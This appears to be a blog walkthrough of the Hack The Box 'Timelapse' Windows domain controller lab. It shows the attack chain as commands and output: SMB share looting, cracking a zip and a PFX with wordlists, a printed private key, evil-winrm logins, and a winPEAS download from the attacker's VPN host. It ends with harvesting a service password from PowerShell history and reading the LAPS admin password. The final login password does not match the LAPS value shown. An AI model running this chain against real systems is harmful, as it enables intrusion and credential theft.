--- 
title: HTB Timelapse Walktrough 
author: Adrià
date: 2022-07-16 14:10:00 +0800
categories: [HTB]
tags: [HTB, Windows, LDAP, SMB]
render_with_liquid: false
---

## Scan and Enumeration
***


Let's start doing a nmap scan. These are the results I obtained:

```
Nmap scan report for 10.10.11.152
Host is up (0.11s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2022-07-05 16:08:19Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h59m56s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-07-05T16:08:37
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   108.19 ms 10.10.14.1
2   108.51 ms 10.10.11.152

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.56 seconds

``` 

We can see that it has some interesting open ports such as kerberos (88), dns (53), ldap (389) and SMB (445). We can assume we are against a Windows DC machine because of the services offered. 

The next thing I tried was checking some public SMB shares: 
```
❯ smbclient --no-pass -L //10.10.11.152
Can't load /etc/samba/smb.conf - run testparm to debug it

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Shares          Disk      
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```
And then I tried to check if I had access to them. I was able to access the ```Shares``` share and list its content:
```
❯ smbclient //10.10.11.152/Shares
Can't load /etc/samba/smb.conf - run testparm to debug it
Password for [WORKGROUP\adri]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 15:39:15 2021
  ..                                  D        0  Mon Oct 25 15:39:15 2021
  Dev                                 D        0  Mon Oct 25 19:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 15:48:42 2021

		6367231 blocks of size 4096. 2062817 blocks available
smb: \> 
```
I first downloaded the backup file found inside *Dev*: 
```
smb: \Dev\> ls
  .                                   D        0  Mon Oct 25 19:40:06 2021
  ..                                  D        0  Mon Oct 25 19:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 15:46:42 2021

		6367231 blocks of size 4096. 2085105 blocks available
smb: \Dev\> get winrm_backup.zip
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (5.9 KiloBytes/sec) (average 5.9 KiloBytes/sec)
```
Then I downloaded the other interesting files to inspect them later: 
```
smb: \HelpDesk\> ls
  .                                   D        0  Mon Oct 25 15:48:42 2021
  ..                                  D        0  Mon Oct 25 15:48:42 2021
  LAPS.x64.msi                        A  1118208  Mon Oct 25 14:57:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 14:57:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 14:57:40 2021
  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 14:57:44 2021

		6367231 blocks of size 4096. 2110122 blocks available
smb: \HelpDesk\> get LAPS_Datasheet.docx 
getting file \HelpDesk\LAPS_Datasheet.docx of size 104422 as LAPS_Datasheet.docx (161.1 KiloBytes/sec) (average 98.1 KiloBytes/sec)
smb: \HelpDesk\> get LAPS_OperationsGuide.docx 
getting file \HelpDesk\LAPS_OperationsGuide.docx of size 641378 as LAPS_OperationsGuide.docx (669.2 KiloBytes/sec) (average 365.1 KiloBytes/sec)
smb: \HelpDesk\> get LAPS_TechnicalSpecification.docx 
getting file \HelpDesk\LAPS_TechnicalSpecification.docx of size 72683 as LAPS_TechnicalSpecification.docx (162.1 KiloBytes/sec) (average 328.6 KiloBytes/sec)
```

## Brute Forcing
***

This ```.docx``` documents contain information about LAPS. The next step I took was to unzip the backup file and check for more sensitive information. However, the file inside this zip was protected by a password. I used Arch Linux and I had an issue cracking this .zip file so I had to download it from Parrot Linux and I used fcrackzip to find the password: 

```
$ fcrackzip -D -v -u -p /usr/share/wordlists/rockyou.txt ./winrm_backup.zip


PASWORD FOUND!!!!: pwd == supremelegacy
```
Now we can unzip it and we can see that there is a .pfx file inside it. A .pfx file contains a SSL certificate and the corresponding private keys:
```
❯ unzip winrm_backup.zip
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
  inflating: legacyy_dev_auth.pfx    
❯ ls
 LAPS_Datasheet.docx         LAPS_TechnicalSpecification.docx   walkthrough.md   
 LAPS_OperationsGuide.docx   legacyy_dev_auth.pfx 
```
I wanted to extract the private key using this openssl command: ```openssl pkcs12 -in legacy_dev_auth.pfx -nocerts -out priv-key.pem -nodes ``` but it required another password. After googling a bit, I decided to try with the ```crackpkcs12``` tool and rockyou.txt to bruteforce the password again: 
```
crackpkcs12 -d /home/adri/Desktop/adri/utils/rockyou.txt -v legacyy_dev_auth.pfx

Dictionary attack - Starting 2 threads

Performance:              3232878 passwords [   11732 passwords per second]
*********************************************************
Dictionary attack - Thread 2 - Password found: thuglegacy
*********************************************************
``` 
Now we can extract the private key and read it: 
```
❯ openssl pkcs12 -in certname.pfx -nocerts -out key.pem -nodes
Can't open certname.pfx for reading, No such file or directory
140137388039040:error:02001002:system library:fopen:No such file or directory:crypto/bio/bss_file.c:69:fopen('certname.pfx','rb')
140137388039040:error:2006D080:BIO routines:BIO_new_file:no such file:crypto/bio/bss_file.c:76:
❯ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
Enter Import Password:
❯ ls
 key.pem               LAPS_OperationsGuide.docx          legacyy_dev_auth.pfx   winrm_backup.zip
 LAPS_Datasheet.docx   LAPS_TechnicalSpecification.docx   walkthrough.md         zip.hash
❯ cat key.pem
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: key.pem
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ Bag Attributes
   2   │     Microsoft Local Key set: <No Values>
   3   │     localKeyID: 01 00 00 00 
   4   │     friendlyName: te-4a534157-c8f1-4724-8db6-ed12f25c2a9b
   5   │     Microsoft CSP Name: Microsoft Software Key Storage Provider
   6   │ Key Attributes
   7   │     X509v3 Key Usage: 90 
   8   │ -----BEGIN PRIVATE KEY-----
   9   │ MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQClVgejYhZHHuLz
  10   │ TSOtYXHOi56zSocr9om854YDu/6qHBa4Nf8xFP6INNBNlYWvAxCvKM8aQsHpv3to
  11   │ pwpQ+YbRZDu1NxyhvfNNTRXjdFQV9nIiKkowOt6gG2F+9O5gVF4PAnHPm+YYPwsb
  12   │ oRkYV8QOpzIi6NMZgDCJrgISWZmUHqThybFW/7POme1gs6tiN1XFoPu1zNOYaIL3
  13   │ dtZaazXcLw6IpTJRPJAWGttqyFommYrJqCzCSaWu9jG0p1hKK7mk6wvBSR8QfHW2
  14   │ qX9+NbLKegCt+/jAa6u2V9lu+K3MC2NaSzOoIi5HLMjnrujRoCx3v6ZXL0KPCFzD
  15   │ MEqLFJHxAgMBAAECggEAc1JeYYe5IkJY6nuTtwuQ5hBc0ZHaVr/PswOKZnBqYRzW
  16   │ fAatyP5ry3WLFZKFfF0W9hXw3tBRkUkOOyDIAVMKxmKzguK+BdMIMZLjAZPSUr9j
  17   │ PJFizeFCB0sR5gvReT9fm/iIidaj16WhidQEPQZ6qf3U6qSbGd5f/KhyqXn1tWnL
  18   │ GNdwA0ZBYBRaURBOqEIFmpHbuWZCdis20CvzsLB+Q8LClVz4UkmPX1RTFnHTxJW0
  19   │ Aos+JHMBRuLw57878BCdjL6DYYhdR4kiLlxLVbyXrP+4w8dOurRgxdYQ6iyL4UmU
  20   │ Ifvrqu8aUdTykJOVv6wWaw5xxH8A31nl/hWt50vEQQKBgQDYcwQvXaezwxnzu+zJ
  21   │ 7BtdnN6DJVthEQ+9jquVUbZWlAI/g2MKtkKkkD9rWZAK6u3LwGmDDCUrcHQBD0h7
  22   │ tykwN9JTJhuXkkiS1eS3BiAumMrnKFM+wPodXi1+4wJk3YTWKPKLXo71KbLo+5NJ
  23   │ 2LUmvvPDyITQjsoZoGxLDZvLFwKBgQDDjA7YHQ+S3wYk+11q9M5iRR9bBXSbUZja
  24   │ 8LVecW5FDH4iTqWg7xq0uYnLZ01mIswiil53+5Rch5opDzFSaHeS2XNPf/Y//TnV
  25   │ 1+gIb3AICcTAb4bAngau5zm6VSNpYXUjThvrLv3poXezFtCWLEBKrWOxWRP4JegI
  26   │ ZnD1BfmQNwKBgEJYPtgl5Nl829+Roqrh7CFti+a29KN0D1cS/BTwzusKwwWkyB7o
  27   │ btTyQf4tnbE7AViKycyZVGtUNLp+bME/Cyj0c0t5SsvS0tvvJAPVpNejjc381kdN
  28   │ 71xBGcDi5ED2hVj/hBikCz2qYmR3eFYSTrRpo15HgC5NFjV0rrzyluZRAoGAL7s3
  29   │ QF9Plt0jhdFpixr4aZpPvgsF3Ie9VOveiZAMh4Q2Ia+q1C6pCSYk0WaEyQKDa4b0
  30   │ 6jqZi0B6S71un5vqXAkCEYy9kf8AqAcMl0qEQSIJSaOvc8LfBMBiIe54N1fXnOeK
  31   │ /ww4ZFfKfQd7oLxqcRADvp1st2yhR7OhrN1pfl8CgYEAsJNjb8LdoSZKJZc0/F/r
  32   │ c2gFFK+MMnFncM752xpEtbUrtEULAKkhVMh6mAywIUWaYvpmbHDMPDIGqV7at2+X
  33   │ TTu+fiiJkAr+eTa/Sg3qLEOYgU0cSgWuZI0im3abbDtGlRt2Wga0/Igw9Ewzupc8
  34   │ A5ZZvI+GsHhm0Oab7PEWlRY=
  35   │ -----END PRIVATE KEY-----
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
We can also extract the certificate and read the content by doing this other openssl command: 

```
❯ openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
Enter Import Password:
❯ ls
 cert.pem   LAPS_Datasheet.docx         LAPS_TechnicalSpecification.docx   walkthrough.md     zip.hash
 key.pem    LAPS_OperationsGuide.docx   legacyy_dev_auth.pfx               winrm_backup.zip  
❯ cat cert.pem
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: cert.pem
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ Bag Attributes
   2   │     localKeyID: 01 00 00 00 
   3   │ subject=CN = Legacyy
   4   │ 
   5   │ issuer=CN = Legacyy
   6   │ 
   7   │ -----BEGIN CERTIFICATE-----
   8   │ MIIDJjCCAg6gAwIBAgIQHZmJKYrPEbtBk6HP9E4S3zANBgkqhkiG9w0BAQsFADAS
   9   │ MRAwDgYDVQQDDAdMZWdhY3l5MB4XDTIxMTAyNTE0MDU1MloXDTMxMTAyNTE0MTU1
  10   │ MlowEjEQMA4GA1UEAwwHTGVnYWN5eTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
  11   │ AQoCggEBAKVWB6NiFkce4vNNI61hcc6LnrNKhyv2ibznhgO7/qocFrg1/zEU/og0
  12   │ 0E2Vha8DEK8ozxpCwem/e2inClD5htFkO7U3HKG9801NFeN0VBX2ciIqSjA63qAb
  13   │ YX707mBUXg8Ccc+b5hg/CxuhGRhXxA6nMiLo0xmAMImuAhJZmZQepOHJsVb/s86Z
  14   │ 7WCzq2I3VcWg+7XM05hogvd21lprNdwvDoilMlE8kBYa22rIWiaZismoLMJJpa72
  15   │ MbSnWEoruaTrC8FJHxB8dbapf341ssp6AK37+MBrq7ZX2W74rcwLY1pLM6giLkcs
  16   │ yOeu6NGgLHe/plcvQo8IXMMwSosUkfECAwEAAaN4MHYwDgYDVR0PAQH/BAQDAgWg
  17   │ MBMGA1UdJQQMMAoGCCsGAQUFBwMCMDAGA1UdEQQpMCegJQYKKwYBBAGCNxQCA6AX
  18   │ DBVsZWdhY3l5QHRpbWVsYXBzZS5odGIwHQYDVR0OBBYEFMzZDuSvIJ6wdSv9gZYe
  19   │ rC2xJVgZMA0GCSqGSIb3DQEBCwUAA4IBAQBfjvt2v94+/pb92nLIS4rna7CIKrqa
  20   │ m966H8kF6t7pHZPlEDZMr17u50kvTN1D4PtlCud9SaPsokSbKNoFgX1KNX5m72F0
  21   │ 3KCLImh1z4ltxsc6JgOgncCqdFfX3t0Ey3R7KGx6reLtvU4FZ+nhvlXTeJ/PAXc/
  22   │ fwa2rfiPsfV51WTOYEzcgpngdHJtBqmuNw3tnEKmgMqp65KYzpKTvvM1JjhI5txG
  23   │ hqbdWbn2lS4wjGy3YGRZw6oM667GF13Vq2X3WHZK5NaP+5Kawd/J+Ms6riY0PDbh
  24   │ nx143vIioHYMiGCnKsHdWiMrG2UWLOoeUrlUmpr069kY/nn7+zSEa2pA
  25   │ -----END CERTIFICATE-----
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
## Obtaining the User Flag
***

I got stuck here for quite a long time. After googling a bit I saw that windows winrm runs on port 5985 and I didn't scan all ports when doing my nmap. I decided to run my nmap again with the -p- option and I saw that this service was running with ssl: 
```
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2022-07-05T20:40:19+00:00; +7h59m58s from scanner time.
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
```
Then I used evil-winrm to log in using this key and cert files and I was able to obtain the user flag at the user Desktop: 
```
ruby /home/adri/Desktop/adri/utils/evil-winrm/evil-winrm.rb -S -i 10.10.11.152 -c cert.pem -k key.pem

Evil-WinRM shell v3.4

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
```
## Privilege Escalation
*** 

To start with the privilege escalation I created an http server using python at the same location as winPEASx64.exe and, inside the windows machine, I uploaded the executable using the ```Invoke-WebRequest``` cmdlet (IWR) using my IP inside the VPN: 
```
*Evil-WinRM* PS C:\Users\legacyy\Documents> IWR http://10.10.14.63:8000/winPEASx64.exe -OutFile winPEASx64.exe
```

After executing it, I saw that there was a Powershell command history located at ```C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt```:
```
ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.17763.1
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    PS history size: 434B
```

If we check the history file we can see some interesting commands that involve a password that we can see when ```$p``` is defined. 
```
*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> cat "C:/Users/legacyy/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt"
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
``` 
I tried to log on using that account and password without succeeding. However, as we can see in the history files, we can repeat the commands and execute as the svc_deploy user by invoking commands. I decided to check the differences between the ```legacyy``` user and the ```svc_deploy``` user and I saw that the last one has the privilege to read the LAPS. Since we found some information about LAPS before, I decided to follow that path. 
```
*Evil-WinRM* PS C:\Users\legacyy\Documents> net user svc_deploy
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 12:12:37 PM
Password expires             Never
Password changeable          10/26/2021 12:12:37 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   7/6/2022 7:15:13 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
```
After some googling I tried to use the ```Get-AdmPassword``` using the computer name of the host (which you can get using the ```hostname``` command) but it didn't worked: 
```
*Evil-WinRM* PS C:\Users\legacyy\Documents> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {Get-AdmPwdPassword -ComputerName dc01}
The term 'Get-AdmPwdPassword' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.

    + CategoryInfo          : ObjectNotFound: (Get-AdmPwdPassword:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
```
After more googling, I saw that if you have permission to read the LAPS, you can see the password by checking the Computer attributes because LAPS adds a new attribute named ```ms-Mcs-AdmPwd``` with the password. After running this command and checking the output, I was able to find an admin password (3i92{K87u45/SPb&63OUm9nL):
```shell
*Evil-WinRM* PS C:\Users\legacyy\Documents> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {Get-ADComputer -LDAPFilter "(name=*DC01*)" -Properties *}


PSComputerName                       : localhost
RunspaceId                           : 316249f0-9ceb-44c6-9e35-7d1bd3f63c3f
AccountExpirationDate                :
accountExpires                       : 9223372036854775807
AccountLockoutTime                   :
AccountNotDelegated                  : False
AllowReversiblePasswordEncryption    : False
AuthenticationPolicy                 : {}
AuthenticationPolicySilo             : {}
BadLogonCount                        : 0
badPasswordTime                      : 0
badPwdCount                          : 0
CannotChangePassword                 : False
CanonicalName                        : timelapse.htb/Domain Controllers/DC01
Certificates                         : {}
CN                                   : DC01
codePage                             : 0
CompoundIdentitySupported            : {False}
countryCode                          : 0
Created                              : 10/23/2021 11:40:55 AM
createTimeStamp                      : 10/23/2021 11:40:55 AM
Deleted                              :
Description                          :
DisplayName                          :
DistinguishedName                    : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName                          : dc01.timelapse.htb
DoesNotRequirePreAuth                : False
dSCorePropagationData                : {10/25/2021 9:03:33 AM, 10/25/2021 9:03:33 AM, 10/23/2021 11:40:55 AM, 1/1/1601 10:16:33 AM}
Enabled                              : True
HomedirRequired                      : False
HomePage                             :
instanceType                         : 4
IPv4Address                          : 10.10.11.152
IPv6Address                          : dead:beef::20d
isCriticalSystemObject               : True
isDeleted                            :
KerberosEncryptionType               : {RC4, AES128, AES256}
LastBadPasswordAttempt               :
LastKnownParent                      :
lastLogoff                           : 0
lastLogon                            : 133016279609409837
LastLogonDate                        : 7/6/2022 5:38:38 PM
lastLogonTimestamp                   : 133016279187691001
localPolicyFlags                     : 0
Location                             :
LockedOut                            : False
logonCount                           : 138
ManagedBy                            :
MemberOf                             : {}
MNSLogonAccount                      : False
Modified                             : 7/6/2022 5:39:05 PM
modifyTimeStamp                      : 7/6/2022 5:39:05 PM
ms-Mcs-AdmPwd                        : 3i92{K87u45/SPb&63OUm9nL
ms-Mcs-AdmPwdExpirationTime          : 133020599453159751
msDFSR-ComputerReferenceBL           : {CN=DC01,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=timelapse,DC=htb}
msDS-GenerationId                    : {209, 176, 121, 109...}
msDS-SupportedEncryptionTypes        : 28
msDS-User-Account-Control-Computed   : 0
```
Then I used these credentials to log on as a Local Admin and retrieve the root flag: 
```
ruby /home/adri/Desktop/adri/utils/evil-winrm/evil-winrm.rb -u Administrator -p 'i{dQA#a.I7Zx,CW!74NUAm63' -i 10.10.11.152 -S

Evil-WinRM shell v3.4

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
```
I had to search for the root flag using the dir command. 

